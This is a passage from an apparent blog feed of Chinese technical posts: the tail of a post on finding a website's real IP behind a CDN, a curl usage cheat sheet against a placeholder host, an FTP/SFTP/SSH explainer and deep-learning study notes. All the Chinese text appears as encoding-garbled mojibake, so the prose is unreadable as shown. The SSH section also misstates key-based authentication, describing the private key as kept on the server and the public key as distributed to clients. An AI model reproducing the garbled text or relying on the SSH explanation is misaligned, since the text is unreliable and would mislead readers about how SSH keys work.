å°±å¯ä»¥å¾—åˆ°IP<br>é€šè¿‡å›½å¤–è®¿é—®ï¼šæœ‰äº›CDNåªé¢å‘å›½å†…çš„è¯·æ±‚ï¼Œå¯¹äºä¸åœ¨æœåŠ¡èŒƒå›´çš„å›½å¤–è¯·æ±‚æœ‰å¯èƒ½ä¸ä¼šç»è¿‡CDNè€Œç›´æ¥è®¿é—®çœŸå®IP<br>ç›´æ¥è®¿é—®CDNæœåŠ¡å™¨ï¼šæœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯æ‹¿åˆ°CDNæœåŠ¡å™¨çš„è´¦æˆ·è‡ªå·±ä¸Šå»æŸ¥</p><h2 id="æ€æ ·æ‰èƒ½æœ‰CDNæœåŠ¡ï¼Ÿ"><a href="#æ€æ ·æ‰èƒ½æœ‰CDNæœåŠ¡ï¼Ÿ" class="headerlink" title="æ€æ ·æ‰èƒ½æœ‰CDNæœåŠ¡ï¼Ÿ"></a>æ€æ ·æ‰èƒ½æœ‰CDNæœåŠ¡ï¼Ÿ</h2><p>é™¤äº†èŠ±é’±ä¹°è¿™ä¸€æœ€ç›´æ¥çš„æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§èƒ½å¤Ÿè·å¾—CDNæœåŠ¡çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ç§ŸèµåŸŸåçš„æ—¶å€™å¾ˆå¤šæœåŠ¡æä¾›å•†ä¼šå…è´¹å¯¹è¯¥åŸŸåæä¾›CDNæœåŠ¡ï¼Œä¸è¦ç™½ä¸è¦</p><p>ä»¥ä¸‹æ˜¯å¯¹æˆ‘è‡ªå·±ç½‘ç«™çš„CDNæŸ¥è¯¢<br><a href="https://www.helloimg.com/image/RadpUh"><img src="https://www.helloimg.com/images/2022/03/20/RadpUh.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/20/RadpUh.png" srcset="data:image/png;base64,666" alt="RadpUh.png"></a></p><p>æœ€åå†è¯´ä¸€å¥ï¼Œæ‹¿åˆ°çœŸå®IPäº†ä¹Ÿæœªå¿…èƒ½å¤Ÿé€šè¿‡IPè®¿é—®ç›®æ ‡ç½‘ç«™</p><blockquote><p>quote<br><a href="https://blog.csdn.net/fly_hps/article/details/98486807">https://blog.csdn.net/fly_hps/article/details/98486807</a><br><a href="https://www.cxybb.com/article/weixin_37104668/115167764">https://www.cxybb.com/article/weixin_37104668/115167764</a><br><a href="https://baike.baidu.com/item/CDN/420951">https://baike.baidu.com/item/CDN/420951</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curlçš„å¸¸è§ç”¨æ³•</title>
      <link href="2022/03/12/curl/"/>
      <url>2022/03/12/curl/</url>
      
        <content type="html"><![CDATA[<p>curlç”¨æ³•ï¼š</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">GETè¯·æ±‚ï¼š</span><br><span class="line">curl https://www.xxx.com</span><br><span class="line"></span><br><span class="line">POSTè¯·æ±‚ï¼š</span><br><span class="line">curl -d key=value https://www.xxx.com</span><br><span class="line"></span><br><span class="line">å¡«å†™è¡¨å•ï¼š</span><br><span class="line">curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi</span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºä¿¡æ¯ï¼š</span><br><span class="line">curl -i https://www.xxx.com</span><br><span class="line"></span><br><span class="line">æŒ‡å®šUSER-AGENT</span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot;</span> https://www.xxx.com</span><br><span class="line">æ³¨ï¼šè‹¥ç•™ç©ºåˆ™ç§»é™¤User-Agentæ ‡å¤´</span><br><span class="line"></span><br><span class="line">è·Ÿéšé‡å®šå‘ï¼š</span><br><span class="line">curl -L https://www.xxx.com</span><br><span class="line">æ³¨ï¼šcurlé»˜è®¤ä¸è·Ÿéšé‡å®šå‘</span><br><span class="line"></span><br><span class="line">å‘é€cookieï¼š</span><br><span class="line">curl -b <span class="string">&quot;foo=bar&quot;</span> https://www.xxx.com</span><br><span class="line"></span><br><span class="line">urlç¼–ç ï¼š</span><br><span class="line">curl --data-urlencode <span class="string">&quot;xxxxxxx&quot;</span> https://www.xxx.com</span><br><span class="line">æ³¨ï¼šè¯¥æ–¹å¼ä¸-dç›¸è¿‘ï¼ŒåŒºåˆ«åœ¨äºæ˜¯å¦ç¼–ç </span><br><span class="line"></span><br><span class="line">ä¿å­˜ç½‘é¡µ(ä¸wgetç›¸ä¼¼)ï¼š</span><br><span class="line">curl -o xxx.html https://www.xxx.com</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·è®¤è¯ï¼š</span><br><span class="line">curl -u <span class="string">&quot;user:passwd&quot;</span> https://www.xxx.com/login</span><br><span class="line"></span><br><span class="line">è¾“å‡ºé€šä¿¡è¿‡ç¨‹ï¼š</span><br><span class="line">curl -v https://www.xxx.com</span><br><span class="line"></span><br><span class="line">è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼š</span><br><span class="line">curl --trace - https://www.xxx.com</span><br><span class="line">æ³¨ï¼šå¯é…åˆ-oå¯¼å‡º</span><br></pre></td></tr></table></figure><blockquote><p>quote<br><a href="https://www.jianshu.com/p/fc0eb6c60816">https://www.jianshu.com/p/fc0eb6c60816</a><br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp,sftpä¸sshä¹‹é—´çš„å…³ç³»</title>
      <link href="2022/03/06/ftp_sftp_ssh/"/>
      <url>2022/03/06/ftp_sftp_ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="ftpå’Œsftpçš„åŒºåˆ«"><a href="#ftpå’Œsftpçš„åŒºåˆ«" class="headerlink" title="ftpå’Œsftpçš„åŒºåˆ«"></a>ftpå’Œsftpçš„åŒºåˆ«</h2><p>è¿™ä¸¤ç§åè®®éƒ½æ˜¯ç”¨äºä¼ è¾“æ–‡ä»¶çš„ï¼Œå…¶ä¸­sftpæ˜¯åŸºäºsshçš„åŸç†<a id="more"></a>å¼€å‘çš„</p><blockquote><p>ftp: File Transfer Protocol<br>stfp: Secure File Transfer Protocol / SSH File Transfer Protocol<br>ssh: Secure Shell</p></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" srcset="data:image/png;base64,666"><br>ftpæ˜¯æ˜æ–‡ä¼ è¾“ï¼Œæœ‰ä¸¤ç§æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼</p><h4 id="ä¸»åŠ¨æ¨¡å¼-Positive-Mode-ï¼š"><a href="#ä¸»åŠ¨æ¨¡å¼-Positive-Mode-ï¼š" class="headerlink" title="ä¸»åŠ¨æ¨¡å¼(Positive Mode)ï¼š"></a>ä¸»åŠ¨æ¨¡å¼(Positive Mode)ï¼š</h4><p><a href="https://www.helloimg.com/image/Gh2qT6"><img src="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" srcset="data:image/png;base64,666" alt="Gh2qT6.png"></a><br><a href="https://www.helloimg.com/image/Gh2s7A"><img src="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" srcset="data:image/png;base64,666" alt="Gh2s7A.png"></a><br>åœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡ç«¯å¼€æ”¾21ï¼Œ20ç«¯å£ï¼›21ç«¯å£ç”¨äºæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç ï¼Œ20ç«¯å£ç”¨äºä¼ è¾“æ•°æ®<br>å®¢æˆ·ç«¯ç™»å½•ftpæœåŠ¡å™¨åéšæœºå¼€æ”¾ä¸€ä¸ªç«¯å£ï¼Œå†å°†è¿™ä¸ªç«¯å£çš„ä¿¡æ¯å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å†é€šè¿‡ç”¨äºä¼ è¾“æ•°æ®çš„20ç«¯å£è¿æ¥è‡³ç”¨æˆ·æä¾›çš„ç«¯å£</p><h4 id="è¢«åŠ¨æ¨¡å¼-Passive-Mode-ï¼š"><a href="#è¢«åŠ¨æ¨¡å¼-Passive-Mode-ï¼š" class="headerlink" title="è¢«åŠ¨æ¨¡å¼(Passive Mode)ï¼š"></a>è¢«åŠ¨æ¨¡å¼(Passive Mode)ï¼š</h4><p><a href="https://www.helloimg.com/image/Gh2mnz"><img src="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" srcset="data:image/png;base64,666" alt="Gh2mnz.png"></a><br><a href="https://www.helloimg.com/image/Gh2JPR"><img src="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" srcset="data:image/png;base64,666" alt="Gh2JPR.png"></a><br>åœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡ç«¯å¼€æ”¾ç”¨äºå®¢æˆ·ç«¯è¿æ¥çš„21ç«¯å£ä»¥åŠä¸€ä¸ªéšæœºç«¯å£ï¼Œè€Œå®¢æˆ·ç«¯åœ¨ç™»å½•ftpæœåŠ¡å™¨åæ¥æ”¶æœåŠ¡ç«¯æä¾›çš„éšæœºç«¯å£çš„ä¿¡æ¯ï¼Œå†è¿æ¥è‡³æœåŠ¡ç«¯çš„è¯¥ç«¯å£ä»¥ä¼ è¾“æ•°æ®</p><h3 id="stfp"><a href="#stfp" class="headerlink" title="stfp"></a>stfp</h3><p><a href="https://www.helloimg.com/image/Gh2eqP"><img src="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" srcset="data:image/png;base64,666" alt="Gh2eqP.jpg"></a></p><blockquote><p>é¦–å…ˆè¦æ˜ç¡®çš„ä¸€ç‚¹æ˜¯ï¼Œstfpæ˜¯sshçš„ä¸€ä¸ªå­æœåŠ¡</p></blockquote><p><a href="https://www.helloimg.com/image/Gh24C5"><img src="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" srcset="data:image/png;base64,666" alt="Gh24C5.png"></a><br>sftpæ˜¯åŸºäºsshçš„æŠ€æœ¯è¿›è¡Œæ–‡ä»¶çš„ä¼ è¾“çš„ï¼Œè€Œsshæ˜¯é€šè¿‡22ç«¯å£è¿›è¡Œé€šä¿¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´sftpä¹Ÿæ˜¯é€šè¿‡22ç«¯å£è¿›è¡Œé€šä¿¡ä»¥åŠæ•°æ®ä¼ è¾“çš„ï¼Œä¸ftpåè®®ç›¸æ¯”ï¼Œé™¤äº†é€šä¿¡ç«¯å£çš„ä¸åŒï¼Œç”±äºsshçš„é€šä¿¡è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥sftpä¸­æ–‡ä»¶çš„ä¼ è¾“ä¹Ÿæ˜¯åŠ å¯†çš„ï¼Œä½†å®é™…çš„å®‰å…¨æ€§è¿˜å–å†³äºsshçš„è¿æ¥æ–¹å¼ï¼›ä¸”åœ¨sshæœåŠ¡å™¨ä¸é€šä¿¡ä¸»æœºï¼ˆæœåŠ¡å™¨ï¼‰åˆ†å¼€æ—¶è¿˜åˆ†æœ‰åŠå®‰å…¨æ¨¡å¼(Less Secure Connection)å’Œå®‰å…¨æ¨¡å¼(Full Secure Connection)</p><blockquote><p>åŠå®‰å…¨æ¨¡å¼æŒ‡ç”¨æˆ·é€šè¿‡sshè¿æ¥sshæœåŠ¡å™¨æ—¶æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯åŠ å¯†çš„ï¼Œè€ŒsshæœåŠ¡å™¨ä¸ä¸»æœºé—´é€šä¿¡çš„æ•°æ®æ˜¯æœªåŠ å¯†çš„</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2xUn"><img src="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" srcset="data:image/png;base64,666" alt="Gh2xUn.png"></a></p><blockquote><p>å®‰å…¨æ¨¡å¼æŒ‡ç”¨æˆ·ä¸sshæœåŠ¡å™¨ä»¥åŠsshæœåŠ¡å™¨ä¸ä¸»æœºé—´çš„é€šä¿¡éƒ½æ˜¯åŠ å¯†çš„</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2At0"><img src="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" srcset="data:image/png;base64,666" alt="Gh2At0.png"></a><br>è€Œå½“sshæœåŠ¡è¿è¡Œäºç›®æ ‡ä¸»æœºä¸Šæ—¶ä¾¿ä¸å­˜åœ¨åŠå®‰å…¨æ¨¡å¼å’Œå®‰å…¨æ¨¡å¼ä¹‹åˆ†äº†</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ä½œä¸ºè¿œç¨‹è¿æ¥ä¸»æœºçš„å¸¸ç”¨æ–¹å¼ï¼Œsshæœ‰ä¸¤ç§è¿æ¥æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œé€šä¿¡ï¼Œè¿™ç§æ–¹å¼éå¸¸æ–¹ä¾¿ï¼Œåªéœ€è¦ä»»æ„ä¸€å°èƒ½å¤Ÿæ¥å…¥äº’è”ç½‘çš„å¸¸ç”¨è®¾å¤‡å°±èƒ½å¤Ÿè¿æ¥ä¸Šè¿œç¨‹ä¸»æœºï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨å—åˆ°ä¸­é—´äººæ”»å‡»çš„å¯èƒ½ï¼›å¦ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡å¯†é’¥åˆ†å‘çš„æ–¹å¼ï¼Œå³åœ¨æœåŠ¡ç«¯ç”Ÿæˆä¸€ä»½ç§é’¥å­˜äºæœåŠ¡å™¨ï¼Œå†ç”Ÿæˆä¸€ä»½å…¬é’¥åˆ†å‘ç»™éœ€è¦é€šä¿¡çš„ä¸»æœºï¼Œè¿™ç§æ–¹å¼ä¸éœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”é€šä¿¡æ—¶éœ€è¦è¿›è¡Œå¯†é’¥ä¸å…¬é’¥çš„éªŒè¯ï¼ŒåŸºæœ¬æœç»äº†ä¸­é—´äººæ”»å‡»çš„å¯èƒ½ï¼Œä½†æ˜¯ç”±äºéœ€è¦æå‰å‡†å¤‡å¥½å…¬é’¥ï¼Œæ•…ä¾¿æºæ€§ä¸å¦‚ç¬¬ä¸€ç§æ–¹å¼</p><blockquote><p>quote<br><a href="https://network.51cto.com/article/603552.html">https://network.51cto.com/article/603552.html</a><br><a href="https://www.zhihu.com/question/20402010">https://www.zhihu.com/question/20402010</a><br><a href="https://blog.csdn.net/cuker919/article/details/6403925">https://blog.csdn.net/cuker919/article/details/6403925</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 5</title>
      <link href="2021/12/25/deep_learning_from_scratch_5/"/>
      <url>2021/12/25/deep_learning_from_scratch_5/</url>
      
        <content type="html"><![CDATA[<h3 id="æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹"><a href="#æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹" class="headerlink" title="æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹"></a>æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹</h3><a id="more"></a><ul><li><p>ç‰©ä½“æ£€æµ‹ â€“ R-CNN</p></li><li><p>å›¾åƒåˆ†å‰² â€“ FCN</p></li><li><p>å›¾åƒæ ‡é¢˜çš„ç”Ÿæˆ â€“ NIC (CNN+RNN)</p></li><li><p>å›¾åƒé£æ ¼å˜æ¢</p></li><li><p>å›¾åƒçš„ç”Ÿæˆ â€“ DCGAN</p></li><li><p>è‡ªåŠ¨é©¾é©¶</p></li><li><p>Dep Q-Network (å¼ºåŒ–å­¦ä¹ )</p></li></ul><h3 id="å¤šæ¨¡æ€å¤„ç†"><a href="#å¤šæ¨¡æ€å¤„ç†" class="headerlink" title="å¤šæ¨¡æ€å¤„ç†"></a>å¤šæ¨¡æ€å¤„ç†</h3><blockquote><p>ç»„åˆå›¾åƒå’Œè‡ªç„¶è¯­è¨€ç­‰å¤šç§ä¿¡æ¯è¿›è¡Œçš„å¤„ç†</p></blockquote><h3 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h3><blockquote><p>ç”Ÿæˆå¼å¯¹æŠ—ç½‘ç»œï¼ˆGAN, Generative Adversarial Networks ï¼‰æ˜¯ä¸€ç§<a href="https://baike.baidu.com/item/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/3729729">æ·±åº¦å­¦ä¹ </a><a href="https://baike.baidu.com/item/%E6%A8%A1%E5%9E%8B/1741186">æ¨¡å‹</a>ï¼Œæ˜¯è¿‘å¹´æ¥å¤æ‚åˆ†å¸ƒä¸Š<a href="https://baike.baidu.com/item/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/810193">æ— ç›‘ç£å­¦ä¹ </a>æœ€å…·å‰æ™¯çš„æ–¹æ³•ä¹‹ä¸€ã€‚æ¨¡å‹é€šè¿‡æ¡†æ¶ä¸­ï¼ˆè‡³å°‘ï¼‰ä¸¤ä¸ªæ¨¡å—ï¼š<a href="https://baike.baidu.com/item/%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/6563656">ç”Ÿæˆæ¨¡å‹</a>ï¼ˆGenerative Modelï¼‰å’Œ<a href="https://baike.baidu.com/item/%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B/16224017">åˆ¤åˆ«æ¨¡å‹</a>ï¼ˆDiscriminative Modelï¼‰çš„äº’ç›¸åšå¼ˆå­¦ä¹ äº§ç”Ÿç›¸å½“å¥½çš„è¾“å‡ºã€‚åŸå§‹ GAN <a href="https://baike.baidu.com/item/%E7%90%86%E8%AE%BA/1732500">ç†è®º</a>ä¸­ï¼Œå¹¶ä¸è¦æ±‚ G å’Œ D éƒ½æ˜¯ç¥ç»ç½‘ç»œï¼Œåªéœ€è¦æ˜¯èƒ½æ‹Ÿåˆç›¸åº”ç”Ÿæˆå’Œåˆ¤åˆ«çš„å‡½æ•°å³å¯ã€‚ä½†å®ç”¨ä¸­ä¸€èˆ¬å‡ä½¿ç”¨æ·±åº¦ç¥ç»ç½‘ç»œä½œä¸º G å’Œ D ã€‚ â€“Baidu Baike</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡ºã€AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 4</title>
      <link href="2021/12/18/deep_learning_from_scratch_4/"/>
      <url>2021/12/18/deep_learning_from_scratch_4/</url>
      
        <content type="html"><![CDATA[<h3 id="å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ«"><a href="#å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ«" class="headerlink" title="å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ«"></a>å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ«</h3><a id="more"></a><blockquote><p>CNNä¸­æ–°å‡ºç°äº†å·ç§¯å±‚å’Œæ± åŒ–å±‚</p></blockquote><h3 id="å…¨è¿æ¥å±‚å­˜åœ¨çš„é—®é¢˜"><a href="#å…¨è¿æ¥å±‚å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="å…¨è¿æ¥å±‚å­˜åœ¨çš„é—®é¢˜"></a>å…¨è¿æ¥å±‚å­˜åœ¨çš„é—®é¢˜</h3><p>åœ¨å…¨è¿æ¥å±‚ä¸­ï¼Œä¼ å…¥çš„å›¾åƒçš„å½¢çŠ¶ä¿¡æ¯è¢«ç ´åäº†ï¼›ç”±äºåœ¨å…¨è¿æ¥å±‚ä¸­ï¼Œæ•°æ®æ˜¯ä»¥ä¸€ç»´çš„å½¢å¼ä¼ å…¥çš„ï¼Œæ•…å¿½ç•¥äº†å›¾åƒä¸­è¯¸å¦‚ç›¸é‚»åƒç´ ä¹‹é—´çš„å…³ç³»</p><h3 id="ç‰¹å¾å›¾"><a href="#ç‰¹å¾å›¾" class="headerlink" title="ç‰¹å¾å›¾"></a>ç‰¹å¾å›¾</h3><p>å·ç§¯å±‚çš„è¾“å…¥è¾“å‡ºæ•°æ®ã€‚æ ¹æ®è¾“å…¥å’Œè¾“å‡ºåˆ†ä¸ºè¾“å…¥ç‰¹å¾å›¾å’Œè¾“å‡ºç‰¹å¾å›¾</p><h3 id="å·ç§¯è¿ç®—"><a href="#å·ç§¯è¿ç®—" class="headerlink" title="å·ç§¯è¿ç®—"></a>å·ç§¯è¿ç®—</h3><p>å·ç§¯è¿ç®—æ˜¯ä»¥ä¸€å®šçš„é—´éš”æ»‘åŠ¨æ»¤æ³¢å™¨çš„çª—å£å¹¶å¯¹è¾“å…¥æ•°æ®åº”ç”¨æ»¤æ³¢å™¨ï¼Œåº”ç”¨çš„æ–¹å¼æœ‰ä¹˜ç§¯ç´¯åŠ ï¼Œåç½®å’Œæ±‚å’Œç­‰</p><h3 id="å¡«å……"><a href="#å¡«å……" class="headerlink" title="å¡«å……"></a>å¡«å……</h3><p>å‘è¾“å…¥æ•°æ®çš„å‘¨å›´å¡«å…¥å›ºå®šçš„æ•°å€¼ï¼›â€œå¹…åº¦ä¸º1çš„å¡«å……â€æŒ‡çš„æ˜¯å‘è¾“å…¥æ•°æ®å‘¨å›´1ä¸ªå•ä½çš„èŒƒå›´å†…å¡«å……0</p><p>ä½œç”¨ï¼šè°ƒæ•´è¾“å‡ºçš„å¤§å°ï¼Œç”±äºåœ¨å·ç§¯è¿ç®—ä¸­ç©ºé—´ä¸æ–­ç¼©å°ï¼Œä¸ºäº†åœ¨ä¿æŒè¾“å‡ºå¤§å°ä¸å˜çš„å‰æä¸‹è¿›è¡Œå·ç§¯è¿ç®—ç”šè‡³æ·±åº¦å·ç§¯ï¼Œå°±éœ€è¦<strong>å¡«å……</strong>æ¥è°ƒæ•´æ•°æ®ç©ºé—´å¤§å°</p><h3 id="æ­¥å¹…"><a href="#æ­¥å¹…" class="headerlink" title="æ­¥å¹…"></a>æ­¥å¹…</h3><blockquote><p>åº”ç”¨æ»¤æ³¢å™¨çš„ä½ç½®é—´éš”</p></blockquote><h3 id="3ç»´æ•°æ®çš„å·ç§¯è¿ç®—"><a href="#3ç»´æ•°æ®çš„å·ç§¯è¿ç®—" class="headerlink" title="3ç»´æ•°æ®çš„å·ç§¯è¿ç®—"></a>3ç»´æ•°æ®çš„å·ç§¯è¿ç®—</h3><p>ä¸2ç»´æ•°æ®çš„å·ç§¯è¿ç®—ä¸åŒçš„æ˜¯ï¼Œ3ç»´æ•°æ®çš„å·ç§¯è¿ç®—åŒæ—¶è¿›è¡Œå¤šé€šé“çš„å·ç§¯å¹¶å°†ç»“æœç›¸åŠ </p><h3 id="æ± åŒ–å±‚"><a href="#æ± åŒ–å±‚" class="headerlink" title="æ± åŒ–å±‚"></a>æ± åŒ–å±‚</h3><p>æ± åŒ–æ˜¯ç¼©å°é«˜ã€é•¿æ–¹å‘ä¸Šçš„ç©ºé—´çš„è¿ç®—ï¼›åŒ…å«Maxæ± åŒ–å’ŒAverageæ± åŒ–ç­‰</p><p>ç‰¹å¾</p><ul><li>æ²¡æœ‰è¦å­¦ä¹ çš„å‚æ•°</li><li>é€šé“æ•°ä¸å‘ç”Ÿå˜åŒ–</li><li>å¯¹å¾®å°çš„ä½ç½®å˜åŒ–å…·æœ‰é²æ£’æ€§ï¼ˆå¥å£®ï¼‰</li></ul><h3 id="å…·æœ‰ä»£è¡¨æ€§çš„CNN"><a href="#å…·æœ‰ä»£è¡¨æ€§çš„CNN" class="headerlink" title="å…·æœ‰ä»£è¡¨æ€§çš„CNN"></a>å…·æœ‰ä»£è¡¨æ€§çš„CNN</h3><ul><li><p>LeNet</p><p>æ˜¯è¿›è¡Œæ‰‹å†™æ•°å­—è¯†åˆ«çš„ç½‘ç»œï¼Œå…·æœ‰è¿ç»­çš„å·ç§¯å±‚å’Œæ± åŒ–å±‚ï¼Œæœ€åç»å…¨è¿æ¥å±‚è¾“å‡ºç»“æœ</p><p>ä¸åŒç‚¹</p><ul><li><p>æ¿€æ´»å‡½æ•°ä¸åŒ</p><p>LeNetä½¿ç”¨sigmoidå‡½æ•°ï¼Œè€Œç°åœ¨çš„CNNä¸»è¦ä½¿ç”¨ReLUå‡½æ•°</p></li><li><p>åœ¨ç¼©å°ä¸­é—´æ•°æ®çš„å¤§å°æ—¶é‡‡ç”¨çš„æ–¹æ³•ä¸åŒ</p><p>åŸå§‹çš„LeNetä¸­ä½¿ç”¨å­é‡‡æ ·(subsampling)ï¼Œè€Œç°åœ¨çš„CNNå¤§å¤šä½¿ç”¨Maxæ± åŒ–</p></li></ul></li><li><p>AlexNet</p><p>åœ¨ç»“æ„ä¸Šä¸LeNetåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆä¸åŒ</p><p>ä¸LeNetçš„å·®å¼‚</p><ul><li>æ¿€æ´»å‡½æ•°ä½¿ç”¨ReLU</li><li>ä½¿ç”¨è¿›è¡Œå±€éƒ¨æ­£è§„åŒ–çš„LRN(Local Response Normalization)å±‚</li><li>ä½¿ç”¨Dropout</li></ul></li></ul><h3 id="Data-Augmentation-æ•°æ®æ‰©å……"><a href="#Data-Augmentation-æ•°æ®æ‰©å……" class="headerlink" title="Data Augmentation(æ•°æ®æ‰©å……)"></a>Data Augmentation(æ•°æ®æ‰©å……)</h3><p>åŸºäºç®—æ³•â€œäººä¸ºåœ°â€æ‰©å……è¾“å…¥å›¾åƒï¼ˆè®­ç»ƒå›¾åƒï¼‰ï¼Œå¦‚æ–½åŠ æ—‹è½¬ã€å‚ç›´æˆ–æ°´å¹³æ–¹å‘ä¸Šçš„ç§»åŠ¨ç­‰å¾®å°å˜åŒ–ï¼Œä»¥æ­¤å¢åŠ å›¾åƒçš„æ•°é‡</p><h3 id="åŠ æ·±å±‚çš„å¥½å¤„"><a href="#åŠ æ·±å±‚çš„å¥½å¤„" class="headerlink" title="åŠ æ·±å±‚çš„å¥½å¤„"></a>åŠ æ·±å±‚çš„å¥½å¤„</h3><ul><li><p>å‡å°‘ç½‘ç»œçš„å‚æ•°æ•°é‡</p><p>ä¸æ²¡æœ‰åŠ æ·±å±‚çš„ç½‘ç»œç›¸æ¯”ï¼ŒåŠ æ·±äº†å±‚çš„ç½‘ç»œå¯ä»¥ç”¨æ›´å°‘çš„å‚æ•°è¾¾åˆ°åŒç­‰æ°´å¹³ï¼ˆæˆ–è€…æ›´å¼ºï¼‰çš„è¡¨ç°åŠ›</p></li><li><p>ä½¿å­¦ä¹ æ›´åŠ é«˜æ•ˆ</p><p>éšç€å±‚çš„åŠ æ·±ï¼Œç¥ç»å…ƒä¼šå¯¹æ›´å¤æ‚çš„ä¸œè¥¿æœ‰å“åº”</p></li><li><p>å¯ä»¥åˆ†å±‚æ¬¡åœ°åˆ†è§£éœ€è¦å­¦ä¹ çš„é—®é¢˜</p></li><li><p>å¯ä»¥åˆ†å±‚æ¬¡åœ°ä¼ é€’ä¿¡æ¯</p></li></ul><h3 id="æ„Ÿå—é‡-receptive-field"><a href="#æ„Ÿå—é‡-receptive-field" class="headerlink" title="æ„Ÿå—é‡(receptive field)"></a>æ„Ÿå—é‡(receptive field)</h3><p>ç»™ç¥ç»å…ƒæ–½åŠ 